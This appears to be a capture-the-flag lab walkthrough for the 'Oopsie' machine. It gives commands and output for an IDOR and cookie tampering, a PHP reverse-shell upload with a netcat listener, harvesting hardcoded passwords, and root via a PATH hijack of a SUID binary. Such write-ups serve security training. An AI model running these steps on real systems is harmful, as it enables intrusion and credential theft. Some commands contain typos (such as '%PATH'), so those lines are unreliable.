# CTF Walkthrough: Oopsie

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Information Gathering](#2-information-gathering)
- [3. Foothold](#3-foothold)
- [4. Lateral Movement](#3-lateral-movement)
- [5. Privilege Escalation](#4-privilege-escalation)

---

## 1. Introduction

**Category:** Burpsuite, Cookie Manupulation, Gobuster dir, File Upload, Reverse shell, Netcat, SUID Exploitation, Path Hijacking, Insecure Direct Object Reference (IDOR)
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Information Gathering

### 2.1. Initial Enumeration
- **Running Services**
    - Command: `nmap -sV -sC 10.129.167.61`
        - Output:
            ```
            PORT   STATE SERVICE VERSION
            22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
            | ssh-hostkey:
            |   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
            |   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
            |_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
            80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
            |_http-server-header: Apache/2.4.29 (Ubuntu)
            |_http-title: Welcome
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 305.12 seconds
            ```
- **Add to /etc/hosts**
    - Command: `sudo vim /etc/hosts`
    - Command: `10.129.167.61 oopsie.htb`

- **Intercept traffic with Burpsuite:**
    - Use FoxyProxy with 127.0.0.1:8080
    - Download certificate from http://burpsuite
    - Under Target > Site map:
        - /cdn-cgi/login

- **Visit http://oopsie.htb/cdn-cgi/login**
    - Login as Guest

- **IDOR**
    - Go to Account, change url ...&id=2 to ...&id=1
    - Open developer console > Storage > Cookies
    - Change Value from 2233 -> 34322
    - You can now access Uploads tab

## 3. Foothold

- **Create a reverse shell in PHP**
    - Source: revshells.com
    - Source: /usr/share/webshells/php

- **Finding the uploaded reverse shell file**
    - Command: `gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u oopsie.htb`
        - Output:
            ```
            /uploads              (Status: 301) [Size: 312] [--> http://oopsie.htb/uploads/]
            Progress: 4744 / 4745 (99.98%)
            ===============================================================
            Finished
            ===============================================================
            ```

- **Reverse shell**
    - Start Netcat
        - Command: `nc -lvnp 1261`
    - Curl 
        - Command: `curl oopsie.htb/uploads/revshell.php`
    - Interactive Shell:
        - Command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
        - Ctrl + Z 
        - Command: stty raw -echo; fg
        - enter
        - Command: export TERM=xterm-256color

- **User Flag**
    - Command: `cat /home/robert/user.txt`
        - Output:
            ```
            f2c74ee8db7983851ab2a96a44eb7981
            ```

## 4. Lateral Movement
- **Find credentials**:
    - Command: `cd /var/www/html/cdn-cgi/login`
    - Command: `grep -i pass* *`
        - Output:
            ```
            index.php:if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
            index.php:<input type="password" name="password" placeholder="Password" />
            ```
    - Command: `cat /etc/passwd`
        - Output:
            ```
            robert:x:1000:1000:robert:/home/robert:/bin/bash
            ```
- **Log in as Robert**
    - Command: `su robert`
    - Password: MEGACORP_4dm1n!!
    - Incorrect Login

- **Find credentials**:
    - Command: `cat db.php`
        - Output:
            ```
            <?php
            $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
            ?>
            ```

- **Log in again as Robert**
    - User: robert
    - Password: M3g4C0rpUs3r!


## 5. Privilege Escalation
- Check elevating Privileges
    - Command: `sudo -l`
        - Output:
            ```
            Sorry, user robert may not run sudo on oopsie.
            ```
    - Command: `id`
        - Output:
            ```
            uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
            ```

- **SUID exploit**
    - Command: `find / -group bugtracker 2>/dev/null`
        - Output:
            ```
            /usr/bin/bugtracker
            ```
    - Command: `bugtracker`
        - Output:
            ```
            ------------------
            : EV Bug Tracker :
            ------------------

            Provide Bug ID: test
            ---------------

            cat: /root/reports/test: No such file or directory
            ```
        - The tool is accepting user input as a name of the file that will be read using the cat command, however, it does not specifies the whole path to file cat and thus we might be able to exploit this. 

    - Command: `ls -la /usr/bin/bugtracker`
        - Output:
            ```
            -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
            ```

    - Command: `file /usr/bin/bugtracker`
        - Output:
            ```
            /usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux
            3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
            ```
        - There is a suid set on that binary, which is a promising exploitation path.

    - We navigate to /tmp, create a new cat executable, with /bin/sh
        - Command: `cd /tmp`
        - Command: `echo /bin/sh > cat`
        - Command: `chmod +x cat`
        - Command: `export PATH=/tmp:%PATH`
    
    - **Root Flag**:
        - Commnad: `bugtacker`
            - Output:
                ```
                #
                ```
        - Command: `/bin/cat /root/root.txt`
            - Output:
                ```
                af13b0bee69f8a877c3faf667f7beacf
                ```




